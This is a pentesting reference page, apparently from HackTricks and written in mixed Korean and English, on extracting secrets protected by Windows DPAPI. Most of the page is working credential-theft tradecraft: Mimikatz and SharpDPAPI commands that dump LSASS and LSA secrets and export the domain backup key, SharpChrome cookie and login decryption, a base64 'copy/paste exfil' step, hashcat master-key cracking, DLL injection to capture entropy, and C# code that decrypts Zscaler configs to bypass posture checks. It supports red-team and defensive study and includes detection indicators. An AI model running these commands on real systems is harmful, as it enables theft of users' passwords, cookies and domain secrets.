# DPAPI - 비밀번호 추출

{{#include ../../banners/hacktricks-training.md}}



## DPAPI란 무엇인가

The Data Protection API (DPAPI)는 주로 Windows 운영 체제에서 **비대칭 개인 키의 대칭 암호화**를 위해 사용되며, 사용자 또는 시스템 비밀을 엔트로피의 주요 소스로 활용합니다. 이는 개발자가 암호화 키의 보호를 직접 관리할 필요 없이, 사용자의 로그온 비밀에서 파생된 키(또는 시스템 암호화의 경우 도메인 인증 비밀)를 사용해 데이터를 암호화할 수 있게 해 암호화 과정을 단순화합니다.

가장 일반적인 사용 방식은 **`CryptProtectData` and `CryptUnprotectData`** 함수를 통해서이며, 이 함수들은 현재 로그인한 세션의 프로세스로 데이터를 안전하게 암호화/복호화할 수 있게 해줍니다. 즉, 암호화된 데이터는 그것을 암호화한 동일한 사용자 또는 시스템만 복호화할 수 있습니다.

또한 이 함수들은 암호화 및 복호화 시 함께 사용되는 **`entropy` parameter**를 받을 수 있으므로, 이 파라미터를 사용해 암호화한 것을 복호화하려면 암호화에 사용된 것과 동일한 entropy 값을 제공해야 합니다.

### 사용자 키 생성

DPAPI는 각 사용자에 대해 고유한 키(이하 **`pre-key`**)를 사용자의 자격 증명을 기반으로 생성합니다. 이 키는 사용자의 비밀번호 및 기타 요소에서 파생되며 알고리즘은 사용자 유형에 따라 다르지만 최종적으로는 SHA1으로 처리됩니다. 예를 들어 도메인 사용자의 경우 **it depends on the NTLM hash of the user**.

이 점은 공격자에게 흥미로운데, 공격자가 사용자의 비밀번호 해시를 획득할 수 있다면:

- 해당 사용자의 키로 암호화된 어떤 데이터든 **DPAPI로 암호화된 것을 API 호출 없이 복호화**할 수 있고
- 유효한 DPAPI 키를 생성하려고 **오프라인으로 비밀번호를 크랙** 시도할 수 있습니다

또한 사용자가 DPAPI로 데이터를 암호화할 때마다 새로운 **master key**가 생성됩니다. 이 master key가 실제로 데이터를 암호화하는 데 사용되는 키입니다. 각 master key는 이를 식별하는 **GUID**(Globally Unique Identifier)가 부여됩니다.

master keys는 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 디렉터리에 저장되며, 여기서 `{SID}`는 해당 사용자의 Security Identifier입니다. master key는 사용자의 **`pre-key`**로 암호화되어 저장되며, 복구를 위해 **domain backup key**로도 암호화되어 저장됩니다(즉, 동일한 키가 서로 다른 두 방식으로 두 번 암호화되어 저장됨).

참고로 master key를 암호화하는 데 사용된 **domain key는 도메인 컨트롤러에 존재하며 변경되지 않습니다**, 따라서 공격자가 도메인 컨트롤러에 접근할 수 있다면 도메인 백업 키를 획득해 도메인 내 모든 사용자의 master key를 복호화할 수 있습니다.

암호화된 블롭에는 헤더에 데이터를 암호화하는 데 사용된 **master key의 GUID**가 포함되어 있습니다.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System 키 생성

이는 머신이 데이터를 암호화하는 데 사용하는 키입니다. 이 키는 SYSTEM 사용자만 접근할 수 있는 특수한 키인 **DPAPI_SYSTEM LSA secret**을 기반으로 합니다. 이 키는 머신 수준 자격증명이나 시스템 전체 비밀처럼 시스템 자체가 접근해야 하는 데이터를 암호화하는 데 사용됩니다.

이 키들은 **도메인 백업이 없습니다** 따라서 로컬에서만 접근할 수 있다는 점에 유의하세요:

- **Mimikatz**는 `mimikatz lsadump::secrets` 명령으로 LSA secrets를 덤프하여 접근할 수 있습니다.
- 해당 비밀은 레지스트리에 저장되어 있으므로, 관리자는 **DACL 권한을 수정하여 접근할 수 있습니다**. 레지스트리 경로는: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- 레지스트리 하이브에서 오프라인 추출도 가능합니다. 예를 들어, 대상에서 관리자 권한으로 하이브를 저장하고 exfiltrate할 수 있습니다:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
그런 다음 분석용 시스템에서 hives로부터 DPAPI_SYSTEM LSA secret을 복구하여 machine-scope blobs(예: scheduled task passwords, service credentials, Wi‑Fi profiles 등)를 복호화하세요:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer와 Google Chrome의 비밀번호 및 자동완성 데이터
- Outlook 및 Windows Mail과 같은 애플리케이션의 이메일 및 내부 FTP 계정 비밀번호
- 공유 폴더, 리소스, 무선 네트워크 및 Windows Vault(암호화 키 포함)에 대한 비밀번호
- 원격 데스크톱 연결, .NET Passport 및 다양한 암호화/인증 용도의 개인 키에 대한 비밀번호
- Credential Manager로 관리되는 네트워크 비밀번호 및 CryptProtectData를 사용하는 애플리케이션(예: Skype, MSN messenger 등)의 개인 데이터
- 레지스트리 내부의 암호화된 블롭
- ...

System protected data includes:
- Wi-Fi 비밀번호
- 예약된 작업 비밀번호
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 로컬 관리자 권한이 있으면, 모든 연결된 사용자의 DPAPI master keys와 SYSTEM key를 추출하기 위해 **LSASS memory에 접근**할 수 있습니다.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 사용자가 local admin privileges를 가지고 있다면, **DPAPI_SYSTEM LSA secret**에 접근하여 machine master keys를 복호화할 수 있습니다:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 사용자의 password 또는 NTLM hash가 알려져 있으면, **사용자의 master keys를 직접 decrypt할 수 있습니다**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 만약 사용자의 세션으로 접속해 있다면, DC에 RPC를 사용해 마스터 키를 복호화하기 위한 **backup key to decrypt the master keys using RPC**를 요청할 수 있습니다. 로컬 admin 권한을 가지고 있고 사용자가 로그인한 상태라면, 이를 위해 **steal his session token**할 수 있습니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## 볼트 목록
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI 암호화 데이터에 접근

### DPAPI 암호화 데이터 찾기

일반 사용자 **보호된 파일**은 다음 위치에 있습니다:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 위 경로들에서 `\Roaming\`을 `\Local\`로 변경한 것도 확인하세요.

열거 예시:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)는 file system, registry 및 B64 blobs에서 DPAPI 암호화된 blobs를 찾을 수 있습니다:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
참고로 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (같은 리포지토리의)는 DPAPI를 사용하여 cookies 같은 민감한 데이터를 복호화하는 데 사용할 수 있습니다.

#### Chromium/Edge/Electron 빠른 레시피 (SharpChrome)

- 현재 사용자, 저장된 로그인/cookies의 대화형 복호화 (사용자 컨텍스트에서 실행될 때 추가 키가 사용자 Credential Manager에서 해결되기 때문에 Chrome 127+의 app-bound cookies에서도 작동합니다):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- 오프라인 분석(파일만 있을 때). 먼저 프로필의 "Local State"에서 AES state key를 추출한 다음 이를 사용해 cookie DB를 복호화합니다:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI 도메인 백업 키 (PVK)와 대상 호스트의 admin 권한을 보유한 경우의 도메인 전역/원격 triage:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- 사용자의 DPAPI prekey/credkey (from LSASS)가 있다면, password cracking을 건너뛰고 프로필 데이터를 직접 decrypt할 수 있습니다:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
참고
- 최신 Chrome/Edge 빌드는 특정 쿠키를 "App-Bound" 암호화로 저장할 수 있습니다. 이러한 특정 쿠키는 추가적인 app-bound key 없이는 오프라인 복호화가 불가능하므로, 해당 키를 자동으로 가져오려면 대상 사용자 컨텍스트에서 SharpChrome을 실행하세요. 아래에 참조된 Chrome 보안 블로그 게시물을 확인하세요.

### 액세스 키 및 데이터

- **Use SharpDPAPI**를 사용하여 현재 세션의 DPAPI로 암호화된 파일에서 자격증명을 가져옵니다:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **자격 증명 정보 가져오기** 예: encrypted data 및 guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **마스터키에 접근**:

RPC를 사용해 **domain backup key**를 요청한 사용자의 마스터키를 복호화:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** 도구는 마스터키 복호화를 위해 다음 인자들도 지원합니다 (예를 들어 `/rpc`로 도메인의 백업 키를 얻거나, `/password`로 평문 비밀번호를 사용하거나, `/pvk`로 DPAPI 도메인 개인 키 파일을 지정할 수 있다는 점에 유의하세요...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **마스터키를 사용하여 데이터 복호화**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** 도구는 또한 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화를 위해 다음 인수를 지원합니다 (참고로 `/rpc`를 사용해 domains backup key를 얻거나, `/password`로 평문 비밀번호를 사용하거나, `/pvk`로 DPAPI domain private key file을 지정하거나, `/unprotect`로 현재 사용자 세션을 사용하도록 할 수 있습니다...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey를 직접 사용(비밀번호 불필요)

LSASS를 덤프할 수 있다면, Mimikatz는 종종 per-logon DPAPI key를 노출하여 plaintext password를 알지 못해도 사용자의 masterkeys를 복호화하는 데 사용할 수 있습니다. 이 값을 도구에 직접 전달하세요:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **현재 사용자 세션**을 사용하여 일부 데이터를 복호화:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py를 사용한 오프라인 복호화

피해자 사용자의 SID와 password(또는 NT hash)를 가지고 있다면, Impacket의 dpapi.py를 사용해 DPAPI masterkeys와 Credential Manager blobs를 완전히 오프라인에서 복호화할 수 있습니다.

- 디스크에서 아티팩트 식별:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- 일치하는 masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- 파일 전송 툴이 불안정하면, 파일을 호스트에서 base64로 인코딩해 출력을 복사하세요:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- 사용자의 SID와 password/hash로 masterkey를 복호화합니다:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 복호화된 masterkey를 사용하여 credential blob을 복호화합니다:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
이 워크플로우는 Windows Credential Manager를 사용하는 애플리케이션이 저장한 도메인 자격 증명(예: `*_adm`와 같은 관리자 계정)을 종종 복구합니다.

---

### 선택적 엔트로피 ("Third-party entropy")﻿

일부 애플리케이션은 `CryptProtectData`에 추가 **entropy** 값을 전달합니다. 이 값이 없으면 올바른 masterkey를 알고 있더라도 blob을 복호화할 수 없습니다. 따라서 이러한 방식으로 보호된 자격 증명을 대상으로 할 때는 entropy를 확보하는 것이 필수적입니다(예: Microsoft Outlook, 일부 VPN 클라이언트).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022)는 대상 프로세스 내부의 DPAPI 함수에 훅을 걸어 제공된 선택적 엔트로피를 투명하게 기록하는 user-mode DLL입니다. `outlook.exe`나 `vpnclient.exe` 같은 프로세스에 대해 EntropyCapture를 **DLL-injection** 모드로 실행하면 각 엔트로피 버퍼를 호출한 프로세스와 blob에 매핑한 파일을 생성합니다. 캡처된 엔트로피는 이후 **SharpDPAPI** (`/entropy:`) 또는 **Mimikatz** (`/entropy:<file>`)에 제공하여 데이터를 복호화하는 데 사용할 수 있습니다.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft는 Windows 10 v1607 (2016)부터 **context 3** masterkey 포맷을 도입했습니다. `hashcat` v6.2.6 (December 2023)은 해시-모드 **22100** (DPAPI masterkey v1 context ), **22101** (context 1) 및 **22102** (context 3)을 추가하여 masterkey 파일에서 직접 user passwords를 GPU로 가속해 cracking할 수 있게 했습니다. 따라서 공격자는 대상 시스템과 상호작용하지 않고 word-list 또는 brute-force 공격을 수행할 수 있습니다.

`DPAPISnoop` (2024) 은 이 과정을 자동화합니다:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
The tool can also parse Credential and Vault blobs, decrypt them with cracked keys and export cleartext passwords.

### 다른 머신의 데이터에 접근

In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option to access a remote machine's data. Of course you need to be able to access that machine and in the following example it's supposed that the **도메인 백업 암호화 키가 알려져 있다고 가정합니다**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 기타 도구

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 는 LDAP 디렉터리에서 모든 사용자와 컴퓨터를 추출하고 RPC를 통해 도메인 컨트롤러 백업 키를 추출하는 작업을 자동화하는 도구입니다. 스크립트는 추출한 컴퓨터들의 IP 주소를 확인한 다음 모든 컴퓨터에 대해 smbclient를 실행하여 모든 사용자의 DPAPI 블롭을 가져오고 도메인 백업 키로 모두 복호화합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP에서 추출한 컴퓨터 목록으로 알지 못했던 모든 서브넷도 찾아낼 수 있습니다!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 는 DPAPI로 보호된 비밀을 자동으로 덤프할 수 있습니다. 2.x 릴리스는 다음을 도입했습니다:

* 수백 대의 호스트에서 블롭을 병렬 수집
* **context 3** 마스터키 파싱 및 Hashcat 자동 크래킹 통합
* Chrome "App-Bound" 암호화된 쿠키 지원 (다음 섹션 참조)
* 엔드포인트를 반복 폴링하고 새로 생성된 블롭을 diff하는 새로운 **`--snapshot`** 모드

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 는 masterkey/credential/vault 파일을 파싱하는 C# 파서로 Hashcat/JtR 형식으로 출력하고 선택적으로 자동으로 크래킹을 호출할 수 있습니다. Windows 11 24H1까지의 머신 및 사용자 마스터키 포맷을 완전히 지원합니다.


## 일반적인 탐지 지표

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 및 기타 DPAPI 관련 디렉터리의 파일 접근.
- 특히 **C$** 또는 **ADMIN$** 같은 네트워크 공유를 통한 접근.
- LSASS 메모리에 접근하거나 마스터키를 덤프하기 위해 **Mimikatz**, **SharpDPAPI** 또는 유사 도구 사용.
- 이벤트 **4662**: *An operation was performed on an object* – 이 이벤트는 **`BCKUPKEY`** 객체에 대한 접근과 연관될 수 있습니다.
- 프로세스가 *SeTrustedCredManAccessPrivilege* (Credential Manager)를 요청할 때의 이벤트 **4673/4674**

---
### 2023-2025 취약점 및 생태계 변화

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). 네트워크 접근권을 가진 공격자가 도메인 멤버를 속여 악성 DPAPI 백업 키를 가져오게 할 수 있었으며, 이를 통해 사용자 마스터키를 복호화할 수 있었습니다. 2023년 11월 누적 업데이트에서 패치되었으므로 관리자는 DC와 워크스테이션이 완전히 패치되었는지 확인해야 합니다.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) 은 기존의 DPAPI 전용 보호를 사용자 **Credential Manager**에 저장된 추가 키로 대체했습니다. 오프라인에서 쿠키를 복호화하려면 이제 DPAPI 마스터키와 **GCM-wrapped app-bound key** 둘 다 필요합니다. SharpChrome v2.3 및 DonPAPI 2.x는 사용자 컨텍스트로 실행될 때 추가 키를 복구할 수 있습니다.


### 사례 연구: Zscaler Client Connector – SID에서 파생된 사용자 정의 엔트로피

Zscaler Client Connector는 `C:\ProgramData\Zscaler` 아래에 여러 구성 파일(예: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)을 저장합니다. 각 파일은 **DPAPI (Machine scope)** 로 암호화되지만 벤더는 디스크에 저장하는 대신 *런타임에 계산되는* **custom entropy** 를 제공합니다.

엔트로피는 다음 두 요소에서 재구성됩니다:

1. `ZSACredentialProvider.dll` 안에 하드코딩된 비밀.
2. 해당 구성에 속한 Windows 계정의 **SID**.

DLL에 의해 구현된 알고리즘은 다음과 동등합니다:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
이 비밀은 디스크에서 읽을 수 있는 DLL에 포함되어 있기 때문에, **SYSTEM 권한을 가진 로컬 공격자는 모든 SID에 대한 엔트로피를 재생성하여 blobs를 오프라인으로 복호화할 수 있습니다:**
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
복호화하면 모든 **장치 보안 상태 검사**와 그 예상 값을 포함한 완전한 JSON 구성이 드러납니다 – 클라이언트 측 우회 시도 시 매우 유용한 정보입니다.

> 팁: 다른 암호화된 아티팩트 (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`)는 DPAPI **없이** entropy (`16` zero bytes)로 보호됩니다. 따라서 SYSTEM 권한을 획득하면 `ProtectedData.Unprotect`로 직접 복호화할 수 있습니다.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
